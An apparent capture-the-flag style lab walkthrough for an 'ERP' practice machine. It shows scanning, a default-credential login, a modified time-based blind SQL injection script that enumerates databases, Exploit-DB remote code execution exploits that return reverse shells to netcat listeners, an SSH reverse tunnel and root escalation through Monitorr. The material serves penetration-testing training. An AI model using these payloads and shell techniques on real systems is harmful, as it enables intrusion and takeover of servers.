@@ -1,0 +1,311 @@
+<div id="__BVID__15___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__15___BV_modal_header_" class="modal-header"><h5 id="__BVID__15___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__15___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for ERP</h1>
+<h2>Summary</h2>
+<p>In this guide, we will leverage a blind SQLi to discover an ERP system which is vulnerable to an arbitary file upload to establish our initial foothold. We will escalate privileges by accessing a system not available to external users to obtain <code>root</code> access.</p>
+<h2>Enumeration</h2>
+<p>We begin the enumeration process with an <code>nmap</code> scan.</p>
+<pre id="fence-code-1" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -T4 -p-  172.16.201.19
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 07:12 MST
+Stats: 0:04:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+Nmap scan report for customers-survey.marketing.pg (172.16.201.19)
+Host is up (0.19s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre>
+<p>We navigate to port <code>80</code> and see the following webpage.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_135_image_1_sm6Z5ftt.png" alt="tsuko">
+<figcaption>tsuko</figcaption>
+</figure>
+<p></p>
+<p>We can use <code>nikto</code> to further enumerate the target.</p>
+<pre id="fence-code-2" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ nikto -h 172.16.201.19             
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          172.16.201.19
++ Target Hostname:    172.16.201.19
++ Target Port:        80
++ Start Time:         2022-09-07 05:31:42 (GMT-7)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie PHPSESSID created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/weberp/index.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3268: /css/: Directory indexing found.
++ OSVDB-3092: /css/: This might be interesting...
++ 7917 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2022-09-07 05:50:30 (GMT-7) (1128 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) test
+</code></pre>
+<p>From the output we see that our scan reveals <code>robots.txt</code> includes an entry.</p>
+<p>Viewing <code>robots.txt</code> we discover <code>/weberp/index.php</code>.</p>
+<pre id="fence-code-3" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://172.16.201.19/robots.txt                                     
+User-agent: *
+Allow: /weberp/index.php
+</code></pre>
+<p>Navigating to <code>http://192.168.100.72/weberp</code> we see the real login form of <code>webERP</code>.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_135_image_2_jSk2rsyz.png" alt="weberp">
+<figcaption>weberp</figcaption>
+</figure>
+<p></p>
+<p>We proceed by searching for potential exploits and discover <a href="https://www.exploit-db.com/exploits/47013" target="_blank">WebERP 4.15 - SQL injection</a>.</p>
+<h2>Exploitation</h2>
+<p>According to the script, we require credentials for exploitation.</p>
+<p>Before attempting to brute force credentials, we test default credentials for webERP and find that we are able to successfully authenticate with <code>admin:weberp</code>.</p>
+<p>We begin by downloading the exploit to our attack machine.</p>
+<pre id="fence-code-4" class="fence-code"><code>kali@kali:~$ wget https://www.exploit-db.com/raw/47013
+</code></pre>
+<p>We view the usage info:</p>
+<pre id="fence-code-5" class="fence-code"><code>(+) usage: &lt;filename&gt; &lt;target&gt; &lt;path&gt; &lt;login&gt; &lt;password&gt; &lt;order&gt;
+(+) eg: &lt;filename&gt; 127.0.0.1 "weberp/webERP/" admin weberp 1' % sys.argv[0]
+Order means the number of company on the website. Can be gathered from the login page and usually equals 0 or 1'
+</code></pre>
+<p>Now we execute the exploit with the credentials <code>admin:weberp</code>.</p>
+<pre id="fence-code-6" class="fence-code"><code>kali@kali:~$ python 47013 192.168.100.72 "weberp/" admin weberp 0
+Blind sqli is confirmed
+</code></pre>
+<p>From the output we see that the target is vulnerable to blind SQLi.</p>
+<p>To proceed, we need to find the SQL server version, the number of databases, and each database's name.</p>
+<p>We know that webERP works on MySQL version 4.3 or above based on the <a href="http://www.weberp.org/weberp/ManualContents.php?ViewTopic=Requirements" target="_blank">Software Requirements</a>.</p>
+<p>To determine the number of databases on the target we need to modify our previous <a href="https://www.exploit-db.com/exploits/47013" target="_blank">exploit</a> to reflect the following:</p>
+<pre id="fence-code-7" class="fence-code"><code>if __name__ == "__main__":
+    #proxies = {'http':'127.0.0.1:8080'}
+    proxies = {}
+    
+    if len(sys.argv) != 6:
+        print '(+) usage: %s &lt;target&gt; &lt;path&gt; &lt;login&gt; &lt;password&gt; &lt;order&gt;' % sys.argv[0]
+        print '(+) eg: %s 127.0.0.1 "weberp/webERP/" admin weberp 1' % sys.argv[0]
+        print 'Order means the number of company on the website. Can be gathered from the login page and usually equals 0 or 1'
+        exit()
+    
+    ip = sys.argv[1] + "/" + sys.argv[2]
+    
+    #if don't have php, set Payload to the next one to check this time-based SQLi: YToxOntpOjA7czoyMzoiMCB3aGVyZSBzbGVlcCgxKT0xOy0tIC0iO30=
+    #payload = generatePayload("0 where sleep(1)=1;-- -", "0")
+    
+    i=1
+    while True:
+        
+        payload = generatePayload("0", "-13.37' or IF((SELECT COUNT(*) FROM information_schema.SCHEMATA)="+str(i)+", sleep(1),FALSE) or '2'='1")
+        
+        # SELECT;
+        #get cookies
+        cookies = getCookies(ip, sys.argv[5], sys.argv[3], sys.argv[4])
+        
+        addSupplierID("GARUMPAGE", cookies, proxies)
+        
+        t1 = time.time()
+        runExploit(cookies, "GARUMPAGE", payload, proxies)
+        t2 = time.time()
+    
+        if (t2-t1&gt;1):
+            print "number of databases on server: " +str(i)
+            break
+        else:
+            i=i+1
+</code></pre>
+<p>Now we execute our modified exploit.</p>
+<pre id="fence-code-8" class="fence-code"><code>kali@kali:~/Desktop/sqliWebERp$ python sqli_num_of_db.py 192.168.100.72 "weberp/" admin weberp 0
+number of databases on server: 3
+</code></pre>
+<p>We have confirmed that there are 3 databases on the server.</p>
+<p>Now we will modify our exploit to reveal the names of each database.</p>
+<pre id="fence-code-9" class="fence-code"><code>def checkForDbName(index, currentDbName):
+    payload = generatePayload("0", "-13.37' or IF((SELECT SUBSTRING(SCHEMA_NAME, 1, "+str(len(currentDbName))+")='"+ currentDbName +"' FROM information_schema.SCHEMATA  LIMIT "+ str(index) +", 1 ), sleep(0.05),FALSE) or '2'='1")
+                
+    
+    t1 = time.time()
+    runExploit(cookies, "GARUMPAGE", payload, proxies)
+    t2 = time.time()
+
+    if (t2-t1&gt;0.5):
+        return True
+    else:
+        return False
+    
+    
+
+if __name__ == "__main__":
+    TOTAL_TIME =time.time()
+    #proxies = {'http':'127.0.0.1:8080'}
+    proxies = {}
+    
+    if len(sys.argv) != 6:
+        print '(+) usage: %s &lt;target&gt; &lt;path&gt; &lt;login&gt; &lt;password&gt; &lt;order&gt;' % sys.argv[0]
+        print '(+) eg: %s 127.0.0.1 "weberp/webERP/" admin weberp 1' % sys.argv[0]
+        print 'Order means the number of company on the website. Can be gathered from the login page and usually equals 0 or 1'
+        exit()
+
+    ip = sys.argv[1] + "/" + sys.argv[2]
+    cookies = getCookies(ip, sys.argv[5], sys.argv[3], sys.argv[4])
+    addSupplierID("GARUMPAGE", cookies, proxies)
+    
+    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
+    namesOfDatabases = []
+    numberOfDbs = 3;
+    
+    for i in range(numberOfDbs):
+        currentDbName='0'
+        if checkForDbName(i, 'information_schema'):
+            namesOfDatabases.append('information_schema')
+            print "Finally, database #"+str(i+1)+" on server: information_schema"
+            continue;
+        flagNoMoreChars = False
+        while (not flagNoMoreChars):
+            for j in range(len(chars)):
+                currentDbName = currentDbName[:len(currentDbName)-1] + chars[j]
+                if checkForDbName(i, currentDbName):
+                    print "database #"+str(i+1)+" on server: " + currentDbName +"...";
+                    currentDbName= currentDbName + '0'
+                    flagNoMoreChars = False
+                    break;
+                else:
+                    flagNoMoreChars = True
+        currentDbName = currentDbName[:len(currentDbName)-1]
+        print "Finally, database #"+str(i+1)+" on server: " + currentDbName
+        namesOfDatabases.append(currentDbName)
+    print "Databases: " + str(namesOfDatabases)
+    print "TOTAL TIME = ", time.time() - TOTAL_TIME
+    
+</code></pre>
+<p>We once again execute our modified exploit, and see the following output.</p>
+<pre id="fence-code-10" class="fence-code"><code>kali@kali:~/Desktop/sqliWebERp$ python sqli_dbNames.py 192.168.100.72 "weberp/" admin weberp 0
+Finally, database #1 on server: information_schema
+database #2 on server: i...
+database #2 on server: in...
+database #2 on server: ino...
+database #2 on server: inoe...
+database #2 on server: inoer...
+database #2 on server: inoerp...
+database #2 on server: inoerp_...
+database #2 on server: inoerp_d...
+database #2 on server: inoerp_db...
+Finally, database #2 on server: inoerp_db
+database #3 on server: w...
+database #3 on server: we...
+database #3 on server: web...
+database #3 on server: webe...
+database #3 on server: weber...
+database #3 on server: weberp...
+database #3 on server: weberp_...
+database #3 on server: weberp_d...
+database #3 on server: weberp_db...
+Finally, database #3 on server: weberp_db
+Databases: ['information_schema', 'inoerp_db', 'weberp_db']
+TOTAL TIME =  36.6472799778
+</code></pre>
+<p>The output reveals an interesting database: <code>inoerp_db</code>.</p>
+<p>When visiting <code>http://192.168.100.72/inoerp</code> we discover another application.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_135_image_3_9vrdDnSM.png" alt="inoerp">
+<figcaption>inoerp</figcaption>
+</figure>
+<p></p>
+<p>After researching <code>inoerp</code> we discover <a href="https://www.exploit-db.com/exploits/48946" target="_blank">InoERP 0.7.2 - Remote Code Execution (Unauthenticated)</a>.</p>
+<p>We download the exploit onto our attacker machine.</p>
+<pre id="fence-code-11" class="fence-code"><code>kali@kali:~$ wget https://www.exploit-db.com/raw/48946
+</code></pre>
+<p>Now we start a listener on our attacker machine.</p>
+<pre id="fence-code-12" class="fence-code"><code>root@kali:~# nc -nvlp 80
+Listening on [any] 80 ...
+</code></pre>
+<p>We execute our exploit.</p>
+<pre id="fence-code-13" class="fence-code"><code>kali@kali:~$ python 48946 http://192.168.100.72/inoerp 192.168.100.44 80
+</code></pre>
+<p>We receive a response in our listener.</p>
+<pre id="fence-code-14" class="fence-code"><code>root@kali:~# nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.100.44] from (UNKNOWN) [192.168.100.72] 58562
+bash: cannot set terminal process group (33996): Inappropriate ioctl for device
+bash: no job control in this shell
+...
+www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$
+</code></pre>
+<h2>Privilege Escalation</h2>
+<p>During our enumeration we list sockets using the <code>ss</code> utility:</p>
+<pre id="fence-code-15" class="fence-code"><code>www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$ ss -antp
+ss -antp                                                                                                                                                   
+State     Recv-Q Send-Q           Local Address:Port               Peer Address:Port                                                                            Process                                                                                                                                               
+LISTEN 0      80                   127.0.0.1:3306                  0.0.0.0:*                                                                                    
+LISTEN 0      4096             127.0.0.53%lo:53                    0.0.0.0:*                                                                                    
+LISTEN 0      128                    0.0.0.0:22                    0.0.0.0:*                                                                                    
+LISTEN 0      4096                 127.0.0.1:8443                  0.0.0.0:*                                                                                    
+ESTAB  0      0               192.168.100.72:22                 5.9.47.204:56603                                                                                
+ESTAB  0      0               192.168.100.72:46962          192.168.100.44:80    users:(("ss",pid=245522,fd=2),("ss",pid=245522,fd=1),("ss",pid=245522,fd=0),("bash",pid=244997,fd=255),("bash",pid=244997,fd=2),("bash",pid=244997,fd=1),("bash",pid=244997,fd=0))
+ESTAB  0      0               192.168.100.72:22                 5.9.47.204:65479                                                                                
+LISTEN 0      511                          *:80                          *:*                                                                                    
+LISTEN 0      128                       [::]:22                       [::]:*                                                                                    
+ESTAB  0      0      [::ffff:192.168.100.72]:80    [::ffff:192.168.100.44]:39938  
+
+</code></pre>
+<p>We see that port <code>8443</code> is open for listening but if we open <code>http://192.168.100.72:8443/</code> in the browser, there is no response.</p>
+<p>To access port <code>8443</code> , we will utilize protocol tunneling.</p>
+<p>We begin protocol tunneling with the following command (SSH server must be running on the attacker machine):</p>
+<pre id="fence-code-16" class="fence-code"><code>www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$ ssh -R 8443:127.0.0.1:8443 kali@192.168.100.44
+&lt;on$ ssh -R 8443:127.0.0.1:8443 kali@192.168.100.44                
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Could not create directory '/var/www/.ssh'.
+Host key verification failed.
+</code></pre>
+<p>From the output we seem to have restrictions on our shell.</p>
+<p>To avoid the restrictions of our shell we can spawn a bash shell through the <code>python3</code> interpreter:</p>
+<pre id="fence-code-17" class="fence-code"><code>www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$ python3 -c "import pty;pty.spawn('/bin/bash')"
+&lt;ion$ python3 -c "import pty;pty.spawn('/bin/bash')"                
+www-data@erp:/var/www/html/inoerp/modules/sys/form_personalization$ ssh -R 8443:127.0.0.1:8443 kali@192.168.100.44
+&lt;on$ ssh -R 8443:127.0.0.1:8443 kali@192.168.100.44                
+Could not create directory '/var/www/.ssh'.
+The authenticity of host '192.168.100.44 (192.168.100.44)' can't be established.
+ECDSA key fingerprint is SHA256:njTwMdys9ogT4RiXrYmhObsAJBULOX0TxI1QX0MkMtk.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+kali@192.168.100.44's password: yourPassword
+
+Linux kali 5.7.0-kali1-amd64 #1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64
+
+The programs included with the Kali GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 22 13:45:30 2022 from 192.168.100.72
+kali@kali:~$
+</code></pre>
+<p>Now on <code>127.0.0.1:8443</code> we see an application titled <code>Monitorr</code> and discover the following <a href="https://www.exploit-db.com/exploits/48980" target="_blank">exploit</a>.</p>
+<p>We begin by downloading the exploit to our attacker machine.</p>
+<pre id="fence-code-18" class="fence-code"><code>kali@kali:~$ wget https://www.exploit-db.com/raw/48980
+</code></pre>
+<p>Now we start a listener.</p>
+<pre id="fence-code-19" class="fence-code"><code>root@kali:~# nc -nvlp 53
+Listening on [any] 53 ...
+</code></pre>
+<p>Returning to our recently downloaded <code>python</code> script we execute it with the following parameters:</p>
+<pre id="fence-code-20" class="fence-code"><code>kali@kali:~$ python 48980 http://127.0.0.1:8443 192.168.100.44 53
+</code></pre>
+<p>We receive a response in our listener and have obtained  <code>root</code> access.</p>
+<pre id="fence-code-21" class="fence-code"><code>root@kali:~# nc -nvlp 53
+listening on [any] 53 ...
+connect to [192.168.100.44] from (UNKNOWN) [192.168.100.72] 34976
+root@erp:~/Monitorr/assets/data/usrimg# whoami
+root
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
